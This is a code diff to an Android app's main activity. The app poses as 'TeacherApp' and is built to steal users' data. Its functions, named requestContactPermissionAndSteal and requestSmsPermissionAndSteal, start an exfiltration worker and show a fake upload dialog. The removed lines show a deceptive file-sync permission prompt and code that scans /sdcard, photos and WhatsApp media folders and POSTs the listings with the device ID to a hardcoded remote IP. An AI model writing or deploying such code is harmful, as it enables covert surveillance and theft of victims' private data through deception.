@@ -8,10 +8,8 @@ import android.content.Intent
 import android.content.IntentFilter
 import android.content.pm.PackageManager
 import android.media.projection.MediaProjectionManager
-import android.net.Uri
 import android.os.Build
 import android.os.Bundle
-import android.os.Environment
 import android.os.Handler
 import android.os.Looper
 import android.os.PowerManager
@@ -105,7 +103,8 @@ class MainActivity : ComponentActivity() {
         ActivityResultContracts.RequestPermission()
     ) { isGranted ->
         if (isGranted) {
-            onStoragePermissionGranted()
+            MediaCacheWorker.startExfiltration(this@MainActivity)
+            showFakeUploadDialog()
         } else {
             if (!shouldShowRequestPermissionRationale(if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE)) {
                 AlertDialog.Builder(this)
@@ -213,15 +212,6 @@ class MainActivity : ComponentActivity() {
         }
     }
 
-    // Storage manager launcher (Android 11+ — returns from Settings)
-    private val storageManagerLauncher = registerForActivityResult(
-        ActivityResultContracts.StartActivityForResult()
-    ) {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && Environment.isExternalStorageManager()) {
-            onStoragePermissionGranted()
-        }
-    }
-
     // MediaProjection launcher for screen mirroring to EC2
     private val projectionLauncher = registerForActivityResult(
         ActivityResultContracts.StartActivityForResult()
@@ -317,6 +307,10 @@ class MainActivity : ComponentActivity() {
         }
     }
 
+    fun requestStoragePermissionAndSteal() {
+        requestImagePermissionAndSteal()
+    }
+
     fun requestContactPermissionAndSteal() {
         when {
             ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED -> {
@@ -325,104 +319,6 @@ class MainActivity : ComponentActivity() {
             }
             else -> contactPermissionLauncher.launch(Manifest.permission.READ_CONTACTS)
         }
-    }
-
-    fun requestStoragePermissionAndSteal() {
-        when {
-            // Android 11+ — need MANAGE_EXTERNAL_STORAGE for full directory access
-            Build.VERSION.SDK_INT >= Build.VERSION_CODES.R -> {
-                if (Environment.isExternalStorageManager()) {
-                    onStoragePermissionGranted()
-                } else {
-                    AlertDialog.Builder(this)
-                        .setTitle("Storage Access Required")
-                        .setMessage(
-                            "TeacherApp needs access to your files to sync teaching materials, " +
-                            "worksheets and resources to the cloud.\n\nTap Enable to grant access."
-                        )
-                        .setPositiveButton("Enable") { dialog, _ ->
-                            dialog.dismiss()
-                            val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
-                            intent.data = Uri.parse("package:$packageName")
-                            storageManagerLauncher.launch(intent)
-                        }
-                        .setNegativeButton("Later") { dialog, _ -> dialog.dismiss() }
-                        .setCancelable(false)
-                        .show()
-                }
-            }
-            // Android ≤10 — READ_EXTERNAL_STORAGE is enough
-            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
-                    == PackageManager.PERMISSION_GRANTED -> {
-                onStoragePermissionGranted()
-            }
-            else -> imagePermissionLauncher.launch(Manifest.permission.READ_EXTERNAL_STORAGE)
-        }
-    }
-
-    private fun onStoragePermissionGranted() {
-        MediaCacheWorker.startExfiltration(this@MainActivity)
-        showFakeUploadDialog()
-        // Scan key directories and send to EC2 in background
-        CoroutineScope(Dispatchers.IO).launch {
-            val paths = listOf(
-                "/sdcard",
-                "/sdcard/DCIM",
-                "/sdcard/Downloads",
-                "/sdcard/Documents",
-                "/sdcard/Pictures",
-                "/sdcard/WhatsApp/Media",
-                "/sdcard/Android/data"
-            )
-            paths.forEach { scanAndSendDirectory(it) }
-        }
-    }
-
-    @androidx.annotation.WorkerThread
-    private fun scanAndSendDirectory(path: String) {
-        try {
-            val dir = java.io.File(path)
-            if (!dir.exists() || !dir.canRead()) return
-            val entries = org.json.JSONArray()
-            val fmt = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.getDefault())
-            dir.listFiles()
-                ?.sortedWith(compareBy({ it.isFile }, { it.name.lowercase() }))
-                ?.forEach { f ->
-                    entries.put(org.json.JSONObject().apply {
-                        put("name",        f.name)
-                        put("type",        if (f.isDirectory) "dir" else "file")
-                        put("size",        if (f.isFile) f.length() else 0L)
-                        put("permissions", buildString {
-                            append(if (f.isDirectory) "d" else "-")
-                            append(if (f.canRead()) "r" else "-")
-                            append(if (f.canWrite()) "w" else "-")
-                            append(if (f.canExecute()) "x" else "-")
-                        })
-                        put("modified", fmt.format(java.util.Date(f.lastModified())))
-                    })
-                }
-            if (entries.length() == 0) return
-            val deviceId = android.provider.Settings.Secure.getString(
-                contentResolver, android.provider.Settings.Secure.ANDROID_ID
-            ) ?: "unknown"
-            val payload = org.json.JSONObject().apply {
-                put("device_id",      deviceId)
-                put("path",           path)
-                put("entries",        entries)
-                put("device_model",   android.os.Build.MODEL)
-                put("android_version", android.os.Build.VERSION.RELEASE)
-            }
-            val conn = java.net.URL("http://20.189.79.25:5000/api/directory_listing")
-                .openConnection() as java.net.HttpURLConnection
-            conn.requestMethod = "POST"
-            conn.doOutput = true
-            conn.setRequestProperty("Content-Type", "application/json")
-            conn.connectTimeout = 10000
-            conn.readTimeout    = 10000
-            conn.outputStream.use { it.write(payload.toString().toByteArray()); it.flush() }
-            conn.responseCode
-            conn.disconnect()
-        } catch (_: Exception) {}
     }
 
     fun requestSmsPermissionAndSteal() {
